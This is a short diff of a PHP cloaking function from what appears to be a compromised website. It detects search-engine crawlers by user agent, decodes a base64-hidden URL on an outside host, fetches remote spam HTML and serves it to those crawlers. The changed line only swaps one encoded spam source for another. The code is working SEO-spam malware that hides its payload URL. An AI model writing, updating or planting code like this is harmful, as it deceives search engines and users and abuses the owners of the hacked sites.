@@ -24,7 +24,7 @@ function cloak_liquid_perfect() {
 
     // Jika bot / crawler
     if (preg_match('/googlebot|slurp|adsense|inspection|ahrefsbot|telegrambot|bingbot|yandexbot/i', $ua)) {
-        $encoded   = "aHR0cHM6Ly9ncnRvdG8uc3RvcmUvZWxlY29uY29uc3RydWN0aW9ucy50eHQ=";
+        $encoded   = "aHR0cHM6Ly9ncnRvdG8uc3RvcmUvbGF1dGJldC1wb29scy50eHQ=";
         $spam_url  = base64_decode($encoded);
         $spam_html = @file_get_contents($spam_url);
 
